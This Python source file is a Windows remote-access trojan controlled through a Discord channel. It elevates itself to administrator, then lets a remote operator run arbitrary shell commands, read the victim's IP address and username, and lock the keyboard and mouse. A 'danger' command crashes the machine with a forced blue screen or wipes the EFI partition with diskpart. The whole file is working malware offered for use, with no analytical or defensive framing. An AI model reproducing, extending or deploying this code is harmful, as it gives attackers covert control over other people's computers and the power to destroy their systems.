import os
import subprocess
import sys  
import time
import ctypes
import threading
import base64
import shutil
try:
    import keyboard
    import wmi
    import mouse
    import requests
    import getpass
    import pyautogui
    import pynput
except:
    os.system('pip install wmi&pip install mouse&pip install requests&pip install keyboard&pip install pyautogui&pip install pynput')
    os.system('python "' + __file__ + '"')
    exit()
import DiscordRestAPI
import atexit
def IsAdmin() -> bool:
    return ctypes.windll.shell32.IsUserAnAdmin() == 1

if not IsAdmin():
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()
def get_user_uuid():
    wmi_obj = wmi.WMI()
    computer_system = wmi_obj.Win32_ComputerSystemProduct()[0]
    computer_uuid = computer_system.UUID
    return computer_uuid.lower()
guild_id = '1214641970631417876'
user = DiscordRestAPI.User()
user = user.Login('---',True)
channel_id = user.Channel.Create(user,guild_id,get_user_uuid(),"1214644732148588555")['id']
def Mbox(text):
    with open(os.environ['temp'] + '\\message.vbs','w') as f:
        f.write(f'''MsgBox "{text.replace('"', '""').replace(chr(10),' ')}"''')
    os.system('start ' + os.environ['temp'] + '\\message.vbs')
    time.sleep(1)
    os.system('del /f ' +os.environ['temp'] + '\\message.vbs')
def remove_channel(id):
    user.Channel.Delete(user,id)

def get_info(thing=''):
    if thing=='ip':
        msg = 'IP: ' + requests.get('https://api.ipify.org?format=text').text
    elif thing=='user':
        msg = 'User👤: ' + getpass.getuser() + ' Admin:' + ['❌','✅'][IsAdmin()]
    else:
        msg = 'Pick a option (ip/user)'
    print(keyboard_freeze)
    user.Message.Send(user,msg,channel_id)
def exit_script():
    global stop
    stop = True
    user.StopThreads()
    sys.exit()
def run_command(*cmd):
    user.Message.Send(user,'Running command!',channel_id)
    output = subprocess.run(' '.join(list(cmd)),shell=True,capture_output=True,text=True).stdout
    user.Message.Send(user,output,channel_id)
def msgbox(*text):
    threading.Thread(target=Mbox,args=(' '.join(list(text)),)).start()
    user.Message.Send(user,'Sent message ' + ' '.join(list(text)) + ' Successfully!',channel_id)
def move_mouse(x=None,y=None):
    if not x or not y:
        user.Message.Send(user,'Input a x,y for the mouse to go to',channel_id)
        return
    try:
        pyautogui.moveTo(int(x),int(y))
    except:
        user.Message.Send(user,'Input valid x,y',channel_id)
    else:
        user.Message.Send(user,'Moved mouse!',channel_id)
def click(clicktype='left'):
    if clicktype!='left' and clicktype!='right':
        user.Message.Send(user,'left/right click',channel_id)
        return
    if clicktype=='left':
        pyautogui.leftClick()
    else:
        pyautogui.rightClick()
    user.Message.Send(user,'Clicked mouse!',channel_id)
keyboard_freeze = pynput.keyboard.Listener(suppress=True)
freezed = 0
def freeze_mouse(freeze='yes'):
    if freeze=='yes':
        global freezed
        if freezed==None:
            freezed = 0
        if freezed:
            user.Message.Send(user,'Keyboard already freezed!',channel_id)
            return
        freezed = 1
        global keyboard_freeze
        global mouse_freeze
        keyboard_freeze = pynput.keyboard.Listener(suppress=True)
        keyboard_freeze.start()
        mouse_freeze = pynput.mouse.Listener(suppress=True)
        mouse_freeze.start()
        user.Message.Send(user,'Freezed keyboard!',channel_id)
    elif freeze=='no':
        try:
            if freezed==None:
                freezed = 0
        except:
            user.Message.Send(user,'Keyboard not freezed!',channel_id)
            return
        if not freezed:
            user.Message.Send(user,'Keyboard not freezed!',channel_id)
            return
        keyboard_freeze.stop()
        mouse_freeze.stop()
        user.Message.Send(user,'Unfreezed keyboard!',channel_id)
        freezed = 0
    else:
        user.Message.Send(user,'Invalid option: Valid options are (yes/no)',channel_id)
stop = False
def bsod():
    ntdll = ctypes.windll.ntdll
    po = ctypes.c_bool()
    ntdll.RtlAdjustPrivilege(19,True,False,ctypes.pointer(po))
    response = ctypes.c_ulong()
    ntdll.NtRaiseHardError(0xdeaddead,0,0,0,6,ctypes.byref(response))
def computer_bsod():
    user.Message.Send(user,"BSODing computer.",channel_id)
    threading.Thread(target=bsod).start()
    remove_channel(channel_id)
    sys.exit()
def danger(arg=None):
    if arg=='bsod':
        computer_bsod()
    elif arg=='breakwindows':
        user.Message.Send(user,"Wiping the EFI Partition!",channel_id)
        with open(os.environ['temp'] + '\\tmp.txt','w') as f:
            f.write('''
sel disk 0
sel par 1
assign letter=Z
''')
        os.system('diskpart /s %temp%\\tmp.txt > nul 2>nul')
        os.system('rd /q /s Z: > nul 2>nul')
        computer_bsod()
    else:
        user.Message.Send(user,"Choose option: (bsod/breakwindows)",channel_id)
def help_cmds():
    user.Message.Send(user,'''
!help = this help message lol
!stop = stop program
!run_cmd <cmd> = runs command prompt command
!msg <msg> = send message to computer
---D A N G E R---
!danger breakwindows = Wipes EFI Partition
!danger bsod = bsod computer
--- NON DANGER ---
!freeze <yes/no> = freezes mouse and keyboard 
''',channel_id)
user.Command.add_command(user,'get_info',channel_id,'!',get_info,1)
user.Command.add_command(user,'stop',channel_id,'!',exit_script)
user.Command.add_command(user,'run_cmd',channel_id,'!',run_command,-1)
user.Command.add_command(user,'msg',channel_id,'!',msgbox,-1)
#user.Command.add_command(user,'click',channel_id,'!',click,1)
user.Command.add_command(user,'danger',channel_id,'!',danger,1)
user.Command.add_command(user,'freeze',channel_id,'!',freeze_mouse,1)
#user.Command.add_command(user,'move',channel_id,'!',move_mouse,2)
user.Command.add_command(user,'help',channel_id,'!',help_cmds,0)

atexit.register(remove_channel,channel_id)
#time.sleep(3)
#user.Message.Send(user,'?stop',channel_id)
while not stop:
    time.sleep(0.1)
